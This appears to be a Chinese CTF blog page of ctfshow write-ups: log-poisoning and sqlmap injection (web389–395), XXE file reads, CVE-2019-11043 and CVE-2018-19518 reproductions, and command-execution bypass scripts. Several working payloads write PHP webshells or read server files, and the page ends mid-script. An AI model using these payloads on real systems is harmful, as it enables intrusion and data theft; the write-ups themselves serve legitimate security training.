<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://4c339478-478a-4112-9297-f8b173856bd3.challenge.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://4c339478-478a-4112-9297-f8b173856bd3.challenge.ctf.show/debug/?file=/var/log/nginx/access.log&quot;</span></span><br><span class="line">cmd=<span class="string">b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line">	<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(cmd),</span><br><span class="line">	<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0MTk5MzQ3NywiZXhwIjoxNjQyMDAwNjc3LCJuYmYiOjE2NDE5OTM0NzcsInN1YiI6ImFkbWluIiwianRpIjoiZTFhODc1NjdkNmYwM2Y5ZGQxNmZlODY2Nzg3ZDk3NmMifQ._Tsdmo_BZuW_pk7XsGTZO-eZwhCj8tc9v1STILqweoI&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(requests.post(url+<span class="string">&#x27;b.php&#x27;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;</span>&#125;,headers=headers).text)</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="web390"><a href="#web390" class="headerlink" title="web390"></a>web390</h2><p>本题的page.php页面具有sql注入，利用sqlmap一把梭<br>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="comment">//15f7f758-ad69-4efd-b54e-70b958779879.challenge.ctf.show/page.php?id=1 --file-read /var/www/html/alsckdfy/check.php --batch</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/a8b0184aa0f5463a8fbf0b5342fe8e06.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h2><p>本题page.php没有注入点，之后发现搜索框，试了一下，发现有注入点<br>同上<br><img src="https://img-blog.csdnimg.cn/247626191008497fa6fd0e4fc0343307.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h2><p>和上一题一样，在同一个位置存在sql注入，因此sql一把梭<br>（本题flag在/flag）<br>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://64ef671c-b75d-4b18-9a9c-653012b494eb.challenge.ctf.show/search.php?title=s&quot;</span> --os-shell -batch </span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/e83e33f403ef44b5b1df08c2ebc2e968.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h2><p>看到题目，用上面的方法，发现无法os 和读文件，因此尝试着爆库，之后发现在库中多出来个link表，看大佬博客，发现在主页面最下方发现过去没见过的搜索引擎<br><img src="https://img-blog.csdnimg.cn/71c1bc8ec57c4c40b61cc8c8614f9098.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>可以用sqlmap插入数据<br>并利用ssrf将/flag的文件写在数据库中，利用<br>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://b3b129d6-b29a-413a-9bb1-b076712592de.challenge.ctf.show/search.php?title=1&#x27;;insert into link values(10,&#x27;a&#x27;,&#x27;file:///flag&#x27;);&quot;</span> -batch </span><br></pre></td></tr></table></figure>
<p>之后访问/link.php?id=10得到flag<br><img src="https://img-blog.csdnimg.cn/6deba91781224ee3aa20dd9904364077.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web394、395"><a href="#web394、395" class="headerlink" title="web394、395"></a>web394、395</h2><p>打开本题，发现上题的思路还能用，因此进行测试，但显现虽然可以插入，但是没有回显，又测试check.php，发现报错。看大佬博客，发现过滤了字符<br>但是可以用16进制绕过，则payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://13eceab7-9766-4beb-9ff7-3ccf15085638.challenge.ctf.show/search.php?title=1&#x27;;insert into link values(10,&#x27;a&#x27;,0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870);&quot;</span> -batch</span><br></pre></td></tr></table></figure>
<p>本题的黑名单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file|check|php/i&#x27;</span>, <span class="variable">$id</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>














</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/01/10/ctfshow%20XXE/">ctfshow XXE</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-01-10</time><div class="content"><p>XXE简介：<br>XXE就是在可以解析XML的地方（比如一个输入框等处）只要可以解析XML语言的代码就可以。在这种地方提交XML的恶意代码来执行。他一般可以做到，内网文件读取，端口扫描，内网程序攻击，任意命令执行等。<br>这边其实XXE是比较少见的，这个漏洞主要也是因为没有对用户输入（用户提交的数据，比如你在输入框输入这个XML恶意代码）并没有合理检测与过滤，将用户提交的数据当XML来执行，造成XXE（XML外部实体注入），最简单的利用方法其实就是用hackbar V2里的XXE选项，他自带了XXE的payload生成功能。直接复制然后放到输入框（可以解析XML代码的地方）就可以了。</p>
<h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>LoadXML是MS提供的XMLDom接口中的一个函数，用于将字符串载入一个XML document,该函数的使用存在很多注意事项<br>simplexml_import_dom() 函数把 DOM 节点转换为 SimpleXMLElement 对象</p>
</blockquote>
<p>paylaod</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;cyx&gt;</span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/cyx&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web374-378"><a href="#web374-378" class="headerlink" title="web374~378"></a>web374~378</h2><p>由于这些题目需要服务器则看大佬wp<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/njh18790816639/article/details/117295145?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164180737616781685331283%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164180737616781685331283&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-117295145.pc_search_insert_es_download&utm_term=ctfshowXXE&spm=1018.2226.3001.4187">大佬wp</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/01/07/CVE-2019-11043%20PHP-FPM%20%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/">CVE-2019-11043复现和学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-01-07</time><div class="content"><h2 id="CVE-2019-11043复现和学习"><a href="#CVE-2019-11043复现和学习" class="headerlink" title="CVE-2019-11043复现和学习"></a>CVE-2019-11043复现和学习</h2><p>漏洞描述<br>CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。<br>向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常。<br>该漏洞需要在nginx.conf中进行特定配置才能触发。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line"> ...</span><br><span class="line"> fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line"> fastcgi_param PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line"> fastcgi_pass   php:<span class="number">9000</span>;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>攻击者可以使用换行符（％0a）来破坏fastcgi_split_path_info指令中的Regexp。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。<br>漏洞范围<br>在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行：<br>PHP 7.0 版本<br>PHP 7.1 版本<br>PHP 7.2 版本<br>PHP 7.3 版本</p>
<p>漏洞复现<br>这里用 CTFShow web311的环境来作为靶机复现<br>首先 exp 需要安装 GO 环境，有点麻烦可以参考一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install golang</span><br><span class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/neex/phuip-fpizdam.git</span></span><br><span class="line">cd phuip-fpizdam</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">到这步可能会报错，一直不能成功</span><br><span class="line">是因为需要换代理，因为我就在这死磕很久</span><br><span class="line">可以执行 go env 看看 proxy 是哪个</span><br><span class="line">报错原因：默认使用的是proxy.golang.org，在国内无法访问</span><br><span class="line">报错解决：执行命令：go env -w GOPROXY=https:<span class="comment">//goproxy.cn（换一个国内能够访问的代理地址</span></span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure>
<p><strong>漏洞利用</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phuip-fpizdam URL/index.php</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/ba582ff367a147ceb4390cb4d1258514.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="成功截图"><br>之后在/index?a=后加所需命令</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96session%E9%A2%98/">一道反序列化session题</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-01-07</time><div class="content"><p>index.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> foo1();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;varr = <span class="string">&quot;phpinfo.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">这是foo1的析构函数</span><br></pre></td></tr></table></figure>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_string(file_get_contents(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])));</span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;varr))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;文件&quot;</span>.<span class="keyword">$this</span>-&gt;varr.<span class="string">&quot;存在&lt;br&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;varr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;varr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral">wp地址
</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/01/07/%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/">数组溢出的一道题</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-01-07</time><div class="content"><p><strong>题目</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$array</span>[++<span class="variable">$c</span>]=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$array</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>解析</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$array</span>[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>这个语句正常赋值时，他一定为1，若想跳过语句则必须使他的赋值出问题。<br>即 使数组溢出</p>
<blockquote>
<p>作为PHP最重要的数据类型HashTable其key值是有一定的范围的，如果设置的key值过大就会出现溢出的问题，临界点是9223372036854775807这个数字。</p>
</blockquote>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/01/07/ctfshow%20CVE-2018-19518%E5%A4%8D%E7%8E%B0/">CVE-2018-19518</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-01-07</time><div class="content"><p><strong>本次测试靶场在ctfshow</strong><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46501419/article/details/115050909?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164130335216780274183925%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164130335216780274183925&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-3-115050909.pc_search_insert_es_download_v2&utm_term=CVE-2018-19518&spm=1018.2226.3001.4187">CVE-2018-19518</a><br><strong>漏洞内容简介</strong></p>
<blockquote>
<p>php imap扩展用户在php中执行邮件收发操作，其imap_open函数会调用rsh来连接远程shell，而debianh/Ubuntu中默认使用ssh来代替rsh功能，也就是说debian系列系统中，执行rsh命令实际执行的是ssh命令<br>debian系列系统有Ubuntu、kali、MX linux、AntiX、PureOS等<br>ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者可以通过注入这个参数，最终将导致命令执行漏洞<br>ProxyCommand用来指定连接到服务器的命令. 其可以是任何的命令,只要能从其标准输入读入数据,然后写出到标准输出即可. 这条命令需要连接到sshd服务器上</p>
</blockquote>
<p><strong>实战操作</strong>：<br>bp抓包后进行修改<br><img src="https://img-blog.csdnimg.cn/145b48a348754005a71ce34c1afb46db.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>%09后面与|前面为要执行命令的base64</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hostname=x+-oProxyCommand%<span class="number">3</span>decho%<span class="number">09</span>ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sL2UucGhw|base64%<span class="number">09</span>-d|sh&#125;a&amp;username=<span class="number">222</span>&amp;password=<span class="number">333</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我的是将一句话写入e.php中<br>蚁剑连接得到shell</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A855_122%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">ctfshow web入门 命令执行</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-01-07</time><div class="content"><h2 id="web-55"><a href="#web-55" class="headerlink" title="web 55"></a>web 55</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>题目为上；<br> 1、用脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://8f03c577-cfac-4047-b9a0-d1b90472aa63.challenge.ctf.show:8080/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;feng.txt&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        breakimport requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://8f03c577-cfac-4047-b9a0-d1b90472aa63.challenge.ctf.show:8080/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span 